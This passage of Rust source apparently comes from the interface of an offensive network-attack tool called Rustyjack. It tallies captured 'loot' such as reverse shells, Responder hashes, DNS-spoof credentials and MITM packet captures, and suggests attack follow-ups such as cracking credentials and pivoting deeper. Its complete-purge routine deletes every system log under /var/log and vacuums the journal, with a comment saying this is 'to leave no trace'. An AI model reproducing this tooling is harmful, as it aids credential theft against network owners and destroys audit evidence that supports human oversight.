            lines.push("Post-connection payloads:".to_string());
            if reverse_shells > 0 {
                lines.push(format!("Reverse shells launched: {}", reverse_shells));
                insights.push("Reverse shells were launched; ensure callbacks stay controlled.".to_string());
                next_steps.push("Review payload.log and close shells that are no longer needed.".to_string());
            }
            if bridge_events > 0 {
                lines.push(format!("Bridge toggles logged: {}", bridge_events));
                insights.push("Transparent bridge used; captures may hold in-transit credentials.".to_string());
                next_steps.push("Review bridge PCAPs for credentials/session tokens.".to_string());
            }
            if bridge_pcaps > 0 {
                lines.push(format!("Bridge captures: {} PCAP(s)", bridge_pcaps));
            }
            if !payload_samples.is_empty() {
                lines.push("Recent payload log entries:".to_string());
                for entry in payload_samples.iter().rev().take(3) {
                    lines.push(format!(" - {}", shorten_for_display(entry, 72)));
                }
            }
        }

        self.append_artifact_section("Wireless loot sweep", wifi_dir, lines, insights, next_steps);
    }

    fn append_mac_usage(
        &self,
        network: &str,
        lines: &mut Vec<String>,
        insights: &mut Vec<String>,
        next_steps: &mut Vec<String>,
    ) {
        lines.push("[MAC Usage]".to_string());
        let mac_lines = self.summarize_mac_usage(network);
        if mac_lines.is_empty() {
            lines.push("No MAC usage entries logged for this network.".to_string());
            next_steps.push(
                "No MAC usage recorded; log activity to track interface rotation.".to_string(),
            );
        } else {
            lines.extend(mac_lines.iter().cloned());
            insights.push("MAC usage recorded; review rotation against opsec needs.".to_string());
        }
        lines.push(String::new());
    }

    fn append_combined_impact(
        &self,
        network: &str,
        eth_dir: &Path,
        wifi_dir: &Path,
        lines: &mut Vec<String>,
        insights: &mut Vec<String>,
        next_steps: &mut Vec<String>,
    ) {
        lines.push("[Combined Impact]".to_string());
        let mut summary = Vec::new();

        let inv_count = match self.read_inventory_summary(eth_dir) {
            Ok(Some((count, _))) => Some(count),
            _ => None,
        };
        if let Some(c) = inv_count {
            summary.push(format!("Ethernet hosts: {}", c));
        }
        let handshake_count = self.count_handshake_files(wifi_dir);
        if handshake_count > 0 {
            summary.push(format!("Wireless captures: {}", handshake_count));
        }

        let mac_count = self.mac_usage_count(network);
        if mac_count > 0 {
            summary.push(format!("MAC entries: {}", mac_count));
        }

        let responder_logs = self.root.join("Responder").join("logs");
        let dnsspoof_caps = self.root.join("DNSSpoof").join("captures");
        let responder_present = dir_has_files(&responder_logs);
        let dnsspoof_present = dir_has_files(&dnsspoof_caps);
        if responder_present {
            summary.push("Responder loot captured".to_string());
        }
        if dnsspoof_present {
            summary.push("DNS spoof captures present".to_string());
        }

        let (reverse_shells, bridge_events, _) = self.summarize_payload_activity();
        let bridge_pcaps = self.count_bridge_pcaps();
        if reverse_shells > 0 {
            summary.push(format!("Reverse shells: {}", reverse_shells));
        }
        if bridge_pcaps > 0 {
            summary.push(format!("Bridge PCAPs: {}", bridge_pcaps));
        }

        // Simple next-step heuristics
        if let Some(c) = inv_count {
            if c > 0 && handshake_count == 0 {
                next_steps.push(
                    "Hosts found on wired but no wireless captures; consider wireless attacks."
                        .to_string(),
                );
            }
        }
        if handshake_count > 0 && responder_present {
            insights.push(
                "Wireless captures + Responder hashes collected; prioritize credential cracking."
                    .to_string(),
            );
        }
        if dnsspoof_present && handshake_count == 0 {
            next_steps.push(
                "DNS spoof run captured visits; follow up with wireless capture/handshake if needed."
                    .to_string(),
            );
        }
        if dnsspoof_present && !responder_present {
            next_steps.push(
                "Pair DNS spoof with Responder to harvest NTLM/HTTP credentials during portal use."
                    .to_string(),
            );
        }
        if reverse_shells > 0 {
            insights.push(
                "Reverse shell callbacks launched; ensure only intended hosts are phoning home."
                    .to_string(),
            );
            next_steps.push("Audit payload.log and shut down shells after testing.".to_string());
        }
        if bridge_pcaps > 0 {
            insights.push(
                "Transparent bridge captures exist; PCAPs may hold cleartext credentials."
                    .to_string(),
            );
            next_steps.push("Review bridge PCAPs for credentials/session tokens.".to_string());
        }
        if handshake_count > 0 && dnsspoof_present {
            next_steps.push(
                "Use portal traffic plus wireless captures to correlate victims and crack credentials."
                    .to_string(),
            );
        }
        if reverse_shells > 0 && handshake_count > 0 {
            next_steps.push(
                "Combine cracked Wi-Fi creds with reverse shell access to pivot deeper."
                    .to_string(),
            );
        }
        if bridge_events > 0 && inv_count.unwrap_or(0) > 0 && handshake_count == 0 {
            next_steps.push(
                "Bridge captures without wireless loot; harvest creds from PCAPs or add handshake capture."
                    .to_string(),
            );
        }

        if summary.is_empty() {
            lines.push("No cross-medium data yet; collect Ethernet and Wireless loot.".to_string());
            next_steps.push(
                "Gather both wired and wireless data to build combined insights.".to_string(),
            );
            lines.push(String::new());
            return;
        }

        lines.push(summary.join(" | "));
        if inv_count.unwrap_or(0) == 0 {
            next_steps
                .push("Inventory empty; run Device Inventory to correlate hosts.".to_string());
        }
        if handshake_count == 0 {
            next_steps.push(
                "No wireless captures; attempt handshake/PMKID or probe captures.".to_string(),
            );
        }
        if mac_count == 0 {
            next_steps.push(
                "MAC usage not logged; ensure MAC logging is enabled during attacks.".to_string(),
            );
        }

        lines.push(String::new());
        insights.push(
            "Combined view links wired hosts, wireless captures, and MAC usage per network."
                .to_string(),
        );
    }

    fn summarize_payload_activity(&self) -> (usize, usize, Vec<String>) {
        let path = self.root.join("loot").join("payload.log");
        let mut reverse_shells = 0usize;
        let mut bridge_events = 0usize;
        let mut recent = Vec::new();
        if let Ok(file) = File::open(&path) {
            for line in BufReader::new(file).lines().flatten() {
                let lower = line.to_ascii_lowercase();
                let mut matched = false;
                if lower.contains("reverse-shell") {
                    reverse_shells += 1;
                    matched = true;
                }
                if lower.contains("bridge start") || lower.contains("bridge stop") {
                    bridge_events += 1;
                    matched = true;
                }
                if matched {
                    recent.push(line.clone());
                    if recent.len() > 5 {
                        recent.remove(0);
                    }
                }
            }
        }
        (reverse_shells, bridge_events, recent)
    }

    fn count_bridge_pcaps(&self) -> usize {
        let eth_root = self.root.join("loot").join("Ethernet");
        if !eth_root.exists() {
            return 0;
        }
        let mut pcaps = 0usize;
        if let Ok(entries) = fs::read_dir(&eth_root) {
            for entry in entries.flatten() {
                let path = entry.path();
                if !path.is_dir() {
                    continue;
                }
                let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
                if !name.starts_with("bridge_") {
                    continue;
                }
                for item in WalkDir::new(&path).into_iter().flatten() {
                    let p = item.path();
                    if !p.is_file() {
                        continue;
                    }
                    if let Some(fname) = p.file_name().and_then(|n| n.to_str()) {
                        if fname.starts_with("mitm_") && fname.ends_with(".pcap") {
                            pcaps += 1;
                        }
                    }
                }
            }
        }
        pcaps
    }

    fn summarize_mac_usage(&self, network: &str) -> Vec<String> {
        let log_path = self.root.join("loot").join("Reports").join("mac_usage.log");
        let file = match File::open(&log_path) {
            Ok(f) => f,
            Err(_) => return Vec::new(),
        };
        let reader = BufReader::new(file);
        let mut entries = Vec::new();
        for line in reader.lines().flatten() {
            if let Ok(rec) = serde_json::from_str::<MacUsageRecord>(&line) {
                if rec.tag == network {
                    entries.push(rec);
                }
            }
        }
        if entries.is_empty() {
            return Vec::new();
        }
        entries.sort_by(|a, b| b.ts.cmp(&a.ts));
        let total = entries.len();
        let mut lines = Vec::new();
        lines.push(format!("MAC usage entries: {}", total));
        for rec in entries.iter().take(5) {
            lines.push(format!(
                " - {} via {} [{}] {}",
                rec.mac, rec.interface, rec.context, rec.ts
            ));
        }
        if total > 5 {
            lines.push(format!(" +{} more entries", total - 5));
        }
        lines
    }

    fn mac_usage_count(&self, network: &str) -> usize {
        let log_path = self.root.join("loot").join("Reports").join("mac_usage.log");
        let file = match File::open(&log_path) {
            Ok(f) => f,
            Err(_) => return 0,
        };
        let reader = BufReader::new(file);
        let mut count = 0usize;
        for line in reader.lines().flatten() {
            if let Ok(rec) = serde_json::from_str::<MacUsageRecord>(&line) {
                if rec.tag == network {
                    count += 1;
                }
            }
        }
        count
    }

    fn read_inventory_summary(&self, dir: &Path) -> Result<Option<(usize, Vec<String>)>> {
        if !dir.exists() {
            return Ok(None);
        }
        let mut files = Vec::new();
        if let Ok(entries) = fs::read_dir(dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                        if name.starts_with("inventory_") && name.ends_with(".json") {
                            files.push(path);
                        }
                    }
                }
            }
        }
        if files.is_empty() {
            return Ok(None);
        }
        files.sort();
        let latest = files.last().cloned()
            .ok_or_else(|| anyhow::anyhow!("No loot files found in directory"))?;
        let data = fs::read_to_string(&latest)
            .with_context(|| format!("Failed to read loot file: {}", latest))?;
        let parsed: Vec<Value> = serde_json::from_str(&data)
            .with_context(|| format!("Failed to parse loot JSON from: {}", latest))?;
        let count = parsed.len();
        let mut samples = Vec::new();
        for dev in parsed.iter().take(4) {
            let ip = dev.get("ip").and_then(|v| v.as_str()).unwrap_or("?");
            let host = dev.get("hostname").and_then(|v| v.as_str()).unwrap_or("");
            let os = dev.get("os_hint").and_then(|v| v.as_str()).unwrap_or("");
            let ports: Vec<String> = dev
                .get("open_ports")
                .and_then(|v| v.as_array())
                .map(|arr| {
                    arr.iter()
                        .filter_map(|p| p.as_u64().map(|n| n as u16))
                        .collect()
                })
                .unwrap_or_else(Vec::new)
                .into_iter()
                .map(|p| format!("{}{}", p, port_role(p)))
                .collect();
            let mut desc = format!("{}", ip);
            if !host.is_empty() {
                desc.push_str(&format!(" ({})", host));
            }
            if !os.is_empty() {
                desc.push_str(&format!(" [{}]", os));
            }
            if !ports.is_empty() {
                desc.push_str(&format!(" ports: {}", ports.join(",")));
            }
            samples.push(desc);
        }
        Ok(Some((count, samples)))
    }

    fn summarize_port_scans(&self, network: &str, eth_dir: &Path) -> Vec<String> {
        let mut summaries = Vec::new();
        let mut candidates = Vec::new();
        if eth_dir.exists() {
            if let Ok(entries) = fs::read_dir(eth_dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_file() {
                        if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                            if name.starts_with("portscan_") && name.ends_with(".txt") {
                                candidates.push(path.clone());
                            }
                        }
                    }
                }
            }
        }
        // Fallback: portscan files in loot/Ethernet containing the network name
        let eth_root = self.root.join("loot").join("Ethernet");
        if let Ok(entries) = fs::read_dir(&eth_root) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                        if name.starts_with("portscan_") && name.contains(network) {
                            candidates.push(path.clone());
                        }
                    }
                }
            }
        }
        if candidates.is_empty() {
            return summaries;
        }

        for path in candidates.iter().take(3) {
            if let Ok((ports, banners)) = self.parse_portscan_file(path) {
                let mut line = format!("Port scan: {} open", ports.len());
                if !ports.is_empty() {
                    let preview: Vec<String> = ports
                        .iter()
                        .take(6)
                        .map(|p| format!("{}{}", p, port_role(*p)))
                        .collect();
                    line.push_str(&format!(" [{}]", preview.join(", ")));
                }
                summaries.push(line);
                if !banners.is_empty() {
                    summaries.push(format!(" Banners: {}", banners.join(" | ")));
                }
            }
        }
        summaries
    }

    fn parse_portscan_file(&self, path: &Path) -> Result<(Vec<u16>, Vec<String>)> {
        let contents = fs::read_to_string(path)?;
        let mut ports = Vec::new();
        let mut banners = Vec::new();
        let mut in_open = false;
        let mut in_banners = false;
        for line in contents.lines() {
            let trimmed = line.trim();
            if trimmed.starts_with("Open ports:") {
                in_open = true;
                in_banners = false;
                continue;
            }
            if trimmed.starts_with("Banners:") {
                in_banners = true;
                in_open = false;
                continue;
            }
            if in_open {
                if let Ok(p) = trimmed.parse::<u16>() {
                    ports.push(p);
                }
            } else if in_banners {
                if !trimmed.is_empty() {
                    banners.push(trimmed.to_string());
                }
            }
        }
        Ok((ports, banners))
    }

    fn collect_portscan_candidates(&self, network: &str, eth_dir: &Path) -> Vec<PathBuf> {
        let mut candidates = Vec::new();
        if eth_dir.exists() {
            if let Ok(entries) = fs::read_dir(eth_dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_file() {
                        if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                            if name.starts_with("portscan_") && name.ends_with(".txt") {
                                candidates.push(path.clone());
                            }
                        }
                    }
                }
            }
        }
        let eth_root = self.root.join("loot").join("Ethernet");
        if let Ok(entries) = fs::read_dir(&eth_root) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                        if name.starts_with("portscan_") && name.contains(network) {
                            candidates.push(path.clone());
                        }
                    }
                }
            }
        }
        candidates
    }

    fn summarize_discovery(&self, network: &str, eth_dir: &Path) -> Vec<String> {
        let mut lines = Vec::new();
        let mut candidates = Vec::new();
        if eth_dir.exists() {
            if let Ok(entries) = fs::read_dir(eth_dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_file() {
                        if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                            if name.starts_with("discovery_") {
                                candidates.push(path.clone());
                            }
                        }
                    }
                }
            }
        }
        let eth_root = self.root.join("loot").join("Ethernet");
        if let Ok(entries) = fs::read_dir(&eth_root) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                        if name.starts_with("discovery_") && name.contains(network) {
                            candidates.push(path.clone());
                        }
                    }
                }
            }
        }
        if candidates.is_empty() {
            return lines;
        }
        for path in candidates.iter().take(2) {
            if let Ok(count) = self.count_discovery_hosts(path) {
                lines.push(format!(
                    "Discovery: {} host(s) in {}",
                    count,
                    shorten_for_display(path.to_string_lossy().as_ref(), 18)
                ));
            }
        }
        lines
    }

    fn count_discovery_hosts(&self, path: &Path) -> Result<usize> {
        let file = File::open(path)?;
        let reader = BufReader::new(file);
        let mut count = 0usize;
        for line in reader.lines().flatten() {
            let trimmed = line.trim();
            if trimmed.is_empty()
                || trimmed.starts_with("LAN Discovery")
                || trimmed.starts_with("Interface")
                || trimmed.starts_with("Timeout")
                || trimmed.starts_with("Hosts:")
            {
                continue;
            }
            if trimmed
                .chars()
                .next()
                .map(|c| c.is_ascii_digit())
                .unwrap_or(false)
            {
                count += 1;
            }
        }
        Ok(count)
    }

    fn summarize_mitm(&self, eth_dir: &Path) -> Vec<String> {
        let mut lines = Vec::new();
        if !eth_dir.exists() {
            return lines;
        }
        let mut pcaps = 0usize;
        if let Ok(entries) = fs::read_dir(eth_dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                        if name.starts_with("mitm_") && name.ends_with(".pcap") {
                            pcaps += 1;
                        }
                    }
                }
            }
        }
        let mut visits = 0usize;
        let mut creds = 0usize;
        let dns_dir = eth_dir.join("dnsspoof");
        if dns_dir.exists() {
            for entry in WalkDir::new(&dns_dir).into_iter().flatten() {
                let path = entry.path();
                if path.is_file() {
                    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                        if name == "visits.log" {
                            visits += count_lines(path).unwrap_or(0);
                        } else if name == "credentials.log" {
                            creds += count_lines(path).unwrap_or(0);
                        }
                    }
                }
            }
        }
        if pcaps == 0 && visits == 0 && creds == 0 {
            lines.push("MITM/DNS: none found".to_string());
        } else {
            lines.push(format!("MITM PCAPs: {}", pcaps));
            lines.push(format!("Spoof visits: {}", visits));
            lines.push(format!("Credentials: {}", creds));
        }
        lines
    }

    fn summarize_credentials(&self, eth_dir: &Path) -> Vec<String> {
        let mut lines = Vec::new();
        let dns_dir = eth_dir.join("dnsspoof");
        if !dns_dir.exists() {
            return lines;
        }
        let mut total_creds = 0usize;
        let mut unique_creds: std::collections::HashSet<String> = std::collections::HashSet::new();
        let mut total_visits = 0usize;
        let mut domains: std::collections::HashMap<String, (usize, usize)> =
            std::collections::HashMap::new();
        let mut earliest: Option<SystemTime> = None;
        let mut latest: Option<SystemTime> = None;

        for entry in WalkDir::new(&dns_dir).into_iter().flatten() {
            let path = entry.path();
            if !path.is_file() {
                continue;
            }
            let fname = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            let domain = path
                .parent()
                .and_then(|p| p.file_name())
                .and_then(|n| n.to_str())
                .unwrap_or("unknown")
                .to_string();
            let meta_time = path.metadata().and_then(|m| m.modified()).ok();
            if let Some(mt) = meta_time {
                earliest = Some(earliest.map(|e| e.min(mt)).unwrap_or(mt));
                latest = Some(latest.map(|l| l.max(mt)).unwrap_or(mt));
            }

            if fname == "credentials.log" {
                if let Ok(file) = File::open(path) {
                    for line in BufReader::new(file).lines().flatten() {
                        let trimmed = line.trim();
                        if trimmed.is_empty() {
                            continue;
                        }
                        total_creds += 1;
                        unique_creds.insert(trimmed.to_string());
                        let entry = domains.entry(domain.clone()).or_insert((0, 0));
                        entry.0 += 1;
                    }
                }
            } else if fname == "visits.log" {
                if let Ok(file) = File::open(path) {
                    for line in BufReader::new(file).lines().flatten() {
                        if line.trim().is_empty() {
                            continue;
                        }
                        total_visits += 1;
                        let entry = domains.entry(domain.clone()).or_insert((0, 0));
                        entry.1 += 1;
                    }
                }
            }
        }

        if total_creds == 0 && total_visits == 0 {
            return lines;
        }

        let mut domain_parts = Vec::new();
        for (d, (c, v)) in domains.iter() {
            if *c > 0 || *v > 0 {
                domain_parts.push(format!("{} (creds {}, visits {})", d, c, v));
            }
        }
        domain_parts.sort();

        if total_creds > 0 {
            lines.push(format!(
                "Credentials: {} total ({} unique)",
                total_creds,
                unique_creds.len()
            ));
            if total_creds > unique_creds.len() {
                lines.push(" Duplicate credentials observed across sessions.".to_string());
            }
        } else {
            lines.push("Credentials: none recorded".to_string());
        }
        if total_visits > 0 {
            lines.push(format!("Spoof visits: {}", total_visits));
        }

        if !domain_parts.is_empty() {
            lines.push(format!(
                "Domains: {}",
                shorten_for_display(&domain_parts.join(" | "), 48)
            ));
        }

        if let Some(ts) = earliest {
            lines.push(format!("First artifact: {}", Self::format_system_time(ts)));
        }
        if let Some(ts) = latest {
            lines.push(format!("Last artifact: {}", Self::format_system_time(ts)));
        }

        lines
    }

    fn count_handshake_files(&self, dir: &Path) -> usize {
        if !dir.exists() {
            return 0;
        }
        let exts = ["pcap", "pcapng", "cap", "hccapx"];
        let mut count = 0usize;
        if let Ok(entries) = fs::read_dir(dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
                        if exts.iter().any(|x| ext.eq_ignore_ascii_case(x)) {
                            count += 1;
                        }
                    }
                }
            }
        }
        count
    }

    fn choose_dnsspoof_site(&mut self, sites: &[String]) -> Result<Option<String>> {
        if sites.is_empty() {
            return Ok(None);
        }
        let mut options = sites.to_vec();
        options.push("Cancel".to_string());
        let Some(choice) = self.choose_from_menu("DNS Spoof Site", &options)? else {
            return Ok(None);
        };
        if choice >= sites.len() {
            Ok(None)
        } else {
            Ok(Some(sites[choice].clone()))
        }
    }

    fn browse_inventory(&mut self, devices: Vec<Value>) -> Result<()> {
        let labels: Vec<String> = devices
            .iter()
            .map(|d| {
                let ip = d.get("ip").and_then(|v| v.as_str()).unwrap_or("?");
                let host = d.get("hostname").and_then(|v| v.as_str()).unwrap_or("");
                if host.is_empty() {
                    format!(" {ip}")
                } else {
                    format!(" {ip} ({host})")
                }
            })
            .collect();

        loop {
            let Some(idx) = self.choose_from_menu("Devices", &labels)? else {
                break;
            };
            if let Some(dev) = devices.get(idx) {
                let ip = dev.get("ip").and_then(|v| v.as_str()).unwrap_or("?");
                let host = dev.get("hostname").and_then(|v| v.as_str()).unwrap_or("");
                let os = dev.get("os_hint").and_then(|v| v.as_str()).unwrap_or("");
                let ports: Vec<String> = dev
                    .get("open_ports")
                    .and_then(|v| v.as_array())
                    .map(|arr| {
                        arr.iter()
                            .filter_map(|p| p.as_u64().map(|v| v.to_string()))
                            .collect()
                    })
                    .unwrap_or_default();
                let services: Vec<String> = dev
                    .get("services")
                    .and_then(|v| v.as_array())
                    .map(|arr| {
                        arr.iter()
                            .filter_map(|s| {
                                let proto =
                                    s.get("protocol").and_then(|v| v.as_str()).unwrap_or("");
                                let detail = s.get("detail").and_then(|v| v.as_str()).unwrap_or("");
                                if proto.is_empty() && detail.is_empty() {
                                    None
                                } else {
                                    Some(format!(
                                        "{}{}",
                                        proto,
                                        if detail.is_empty() {
                                            "".into()
                                        } else {
                                            format!(": {}", detail)
                                        }
                                    ))
                                }
                            })
                            .collect()
                    })
                    .unwrap_or_default();
                let mut lines = Vec::new();
                lines.push(format!("IP: {}", ip));
                if !host.is_empty() {
                    lines.push(format!("Host: {}", host));
                }
                if !os.is_empty() {
                    lines.push(format!("OS: {}", os));
                }
                if !ports.is_empty() {
                    lines.push(format!("Ports: {}", ports.join(", ")));
                }
                if !services.is_empty() {
                    lines.push("Services:".to_string());
                    for svc in services.iter().take(4) {
                        lines.push(format!(" - {}", shorten_for_display(svc, 18)));
                    }
                    if services.len() > 4 {
                        lines.push(format!(" +{} more", services.len() - 4));
                    }
                }
                self.show_message("Device", lines)?;
            }
        }
        Ok(())
    }

    fn complete_purge(&mut self) -> Result<()> {
        let root = self.root.clone();
        self.show_message(
            "Complete Purge",
            [
                "Erase Rustyjack completely.",
                "Deletes loot/logs, binaries,",
                "source tree, service, udev.",
                "Journal logs are vacuumed.",
                "",
                "Cannot be undone.",
            ],
        )?;

        let confirm = self.choose_from_list(
            "Erase Rustyjack?",
            &["Delete everything".to_string(), "Cancel".to_string()],
        )?;
        if confirm != Some(0) {
            return Ok(());
        }

        let final_confirm = self.choose_from_list(
            "Final Confirm",
            &["Yes - wipe Rustyjack".to_string(), "Abort".to_string()],
        )?;
        if final_confirm != Some(0) {
            return Ok(());
        }

        self.show_progress("Complete Purge", ["Removing Rustyjack...", "Please wait"])?;
        let report = self.perform_complete_purge(&root);

        let mut lines = vec![
            format!("Removed {} item(s)", report.removed),
            if report.service_disabled {
                "Service disabled".to_string()
            } else {
                "Service disable failed".to_string()
            },
            "Logs cleared".to_string(),
            "Reboot recommended".to_string(),
        ];

        if !report.errors.is_empty() {
            lines.push("Errors:".to_string());
            for err in report.errors.iter().take(3) {
                lines.push(shorten_for_display(err, 18));
            }
            if report.errors.len() > 3 {
                lines.push(format!("+{} more", report.errors.len() - 3));
            }
        } else {
            lines.push("No errors reported".to_string());
        }
        lines.push("UI exiting now".to_string());

        self.show_message("Complete Purge", lines)?;
        std::process::exit(0);
    }

    fn perform_complete_purge(&self, root: &Path) -> PurgeReport {
        let mut removed = 0usize;
        let mut errors = Vec::new();
        let mut service_disabled = false;

        // Move to a safe working directory so the Rustyjack tree can be deleted.
        let _ = std::env::set_current_dir("/tmp");

        let mut delete_path = |path: &Path, errors: &mut Vec<String>| {
            if !path.exists() {
                return;
            }
            if path == Path::new("/") {
                errors.push("Refused to delete /".to_string());
                return;
            }
            let res = if path.is_dir() {
                fs::remove_dir_all(path)
            } else {
                fs::remove_file(path)
            };
            match res {
                Ok(_) => removed += 1,
                Err(e) => errors.push(format!("{}: {}", path.display(), e)),
            }
        };

        // Disable unit so it cannot restart.
        if let Ok(status) = Command::new("systemctl")
            .args(["disable", "rustyjack.service"])
            .status()
        {
            if status.success() {
                service_disabled = true;
            } else {
                errors.push("systemctl disable rustyjack.service failed".to_string());
            }
        } else {
            errors.push("systemctl disable rustyjack.service failed".to_string());
        }

        let system_paths = [
            PathBuf::from("/usr/local/bin/rustyjack-ui"),
            PathBuf::from("/etc/systemd/system/rustyjack.service"),
            PathBuf::from("/etc/systemd/system/multi-user.target.wants/rustyjack.service"),
            PathBuf::from("/etc/udev/rules.d/99-rustyjack-wifi.rules"),
        ];
        for path in system_paths.iter() {
            delete_path(path, &mut errors);
        }

        // Remove loot, logs, cache, and source tree.
        let data_paths = [
            root.join("loot"),
            root.join("Responder"),
            root.join("wifi"),
            root.join("scripts"),
            root.join("target"),
            root.to_path_buf(),
        ];
        for path in data_paths.iter() {
            delete_path(path, &mut errors);
        }

        // Remove system logs to leave no trace.
        for entry in WalkDir::new("/var/log").into_iter().filter_map(|e| e.ok()) {
            if entry.file_type().is_file() {
                let path = entry.path();
                match fs::remove_file(path) {
                    Ok(_) => removed += 1,
                    Err(e) => errors.push(format!("{}: {}", path.display(), e)),
                }
            }
        }

        // Clear journald history.
        let _ = Command::new("journalctl").arg("--rotate").status();
        let _ = Command::new("journalctl").arg("--vacuum-time=1s").status();
        let _ = Command::new("journalctl").arg("--vacuum-size=1K").status();

        // Reload systemd to drop unit references.
        let _ = Command::new("systemctl").arg("daemon-reload").status();
        let _ = Command::new("systemctl")
            .args(["reset-failed", "rustyjack.service"])
            .status();

        // Flush writes before exiting.
        let _ = Command::new("sync").status();

        PurgeReport {
            removed,
            service_disabled,
            errors,
        }
    }

    fn purge_logs(&mut self) -> Result<()> {
        let root = self.root.clone();
        let bases = vec![root.join("loot"), root.join("Responder").join("logs")];

        // Collect candidates first for confirmation
        let mut candidates = Vec::new();
        for base in &bases {
            if !base.exists() {
                continue;
            }
            for entry in WalkDir::new(base).into_iter().filter_map(|e| e.ok()) {
                let path = entry.path();
                if path.is_file() && self.is_log_file(path) {
                    candidates.push(path.to_path_buf());
                }
            }
        }

        if candidates.is_empty() {
            return self.show_message("Purge Logs", ["No log files found", "Nothing to delete"]);
        }

        let confirm = self.choose_from_list(
            "Delete Logs?",
            &[
                format!("Delete {} log file(s)", candidates.len()),
                "Cancel".to_string(),
            ],
        )?;
        if confirm != Some(0) {
            return Ok(());
        }

        let mut deleted = 0usize;
        for path in candidates {
            if fs::remove_file(&path).is_ok() {
                deleted += 1;
            }
        }

        self.show_message(
            "Purge Logs",
            [
                format!("Removed {} log file(s)", deleted),
                "Captures/results kept".to_string(),
            ],
        )
    }

    fn is_log_file(&self, path: &Path) -> bool {
        // Delete anything inside a directory named "logs"
        if path
            .ancestors()
            .any(|p| p.file_name().and_then(|n| n.to_str()) == Some("logs"))
        {
            return true;
        }
        let name = match path.file_name().and_then(|n| n.to_str()) {
            Some(n) => n.to_ascii_lowercase(),
            None => return false,
        };
        name.ends_with(".log") || name.starts_with("log_") || name.contains("log")
    }

    /// Manage hotspot (start/stop, randomize credentials)
    fn manage_hotspot(&mut self) -> Result<()> {
        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message(
                "Hotspot",
                ["Hotspot control is available", "on Linux targets only."],
            );
        }

        #[cfg(target_os = "linux")]
        {
            loop {
                let status = self
                    .core
                    .dispatch(Commands::Hotspot(HotspotCommand::Status))?;
                let data = status.1;
                let running = data
                    .get("running")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false);
                let ap_iface = data
                    .get("ap_interface")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string();
                let upstream_iface = data
                    .get("upstream_interface")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string();
                let upstream_ready = data
                    .get("upstream_ready")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(true);
                let current_ssid = data
                    .get("ssid")
                    .and_then(|v| v.as_str())
                    .unwrap_or(&self.config.settings.hotspot_ssid)
                    .to_string();
                let current_password = data
                    .get("password")
                    .and_then(|v| v.as_str())
                    .unwrap_or(&self.config.settings.hotspot_password)
                    .to_string();

                // Enforce isolation: keep active + hotspot interfaces alive
                let mut allow_list = vec![self.config.settings.active_network_interface.clone()];
                if !ap_iface.is_empty() {
                    allow_list.push(ap_iface.clone());
                }
                if !upstream_iface.is_empty() {
                    allow_list.push(upstream_iface.clone());
                }
                if let Err(e) = self.apply_interface_isolation(&allow_list) {
                    self.show_message("Hotspot", [format!("Isolation failed: {}", e)])?;
                }

                let mut lines = vec![
                    format!("SSID: {}", current_ssid),
                    format!("Password: {}", current_password),
                    "".to_string(),
                    format!("Status: {}", if running { "ON" } else { "OFF" }),
                ];
                if running {
                    lines.push(format!("AP: {}", ap_iface));
                    let upstream_line = if upstream_iface.is_empty() {
                        "Upstream: none (offline)".to_string()
                    } else if upstream_ready {
                        format!("Upstream: {} (internet)", upstream_iface)
                    } else {
                        format!("Upstream: {} (offline/no IP)", upstream_iface)
                    };
                    lines.push(upstream_line);
                }

                let options = if running {
                    lines.push("Turn off to exit this view".to_string());
                    vec!["Turn off hotspot".to_string(), "Refresh".to_string()]
                } else {
                    vec![
                        "Start hotspot".to_string(),
                        "Randomize name".to_string(),
                        "Randomize password".to_string(),
                        "Back".to_string(),
                    ]
                };

                let choice = self.choose_from_list("Hotspot", &options)?;
                match (running, choice) {
                    (true, Some(0)) => {
                        let _ = self.core.dispatch(Commands::Hotspot(HotspotCommand::Stop));
                    }
                    (true, Some(1)) => {
                        continue;
                    }
                    (true, None) => return Ok(()),
                    (false, Some(0)) => {
                        // Select interfaces using hardware detect
                        let (_msg, detect) = self
                            .core
                            .dispatch(Commands::Hardware(HardwareCommand::Detect))?;

                        let mut ethernet = Vec::new();
                        if let Some(arr) = detect.get("ethernet_ports").and_then(|v| v.as_array()) {
                            for item in arr {
                                if let Ok(info) =
                                    serde_json::from_value::<InterfaceSummary>(item.clone())
                                {
                                    ethernet.push(info.name);
                                }
                            }
                        }

                        let mut wifi = Vec::new();
                        if let Some(arr) = detect.get("wifi_modules").and_then(|v| v.as_array()) {
                            for item in arr {
                                if let Ok(info) =
                                    serde_json::from_value::<InterfaceSummary>(item.clone())
                                {
                                    wifi.push(info.name);
                                }
                            }
                        }

                        if wifi.is_empty() {
                            return self.show_message(
                                "Hotspot",
                                [
                                    "No WiFi interface found",
                                    "",
                                    "Plug in or enable a",
                                    "WiFi adapter to host",
                                    "the hotspot.",
                                ],
                            );
                        }

                        let upstream_pref = if ethernet.contains(&"eth0".to_string()) {
                            "eth0".to_string()
                        } else {
                            ethernet
                                .first()
                                .cloned()
                                .or_else(|| wifi.first().cloned())
                                .unwrap_or_default()
                        };

                        let mut upstream_options = Vec::new();
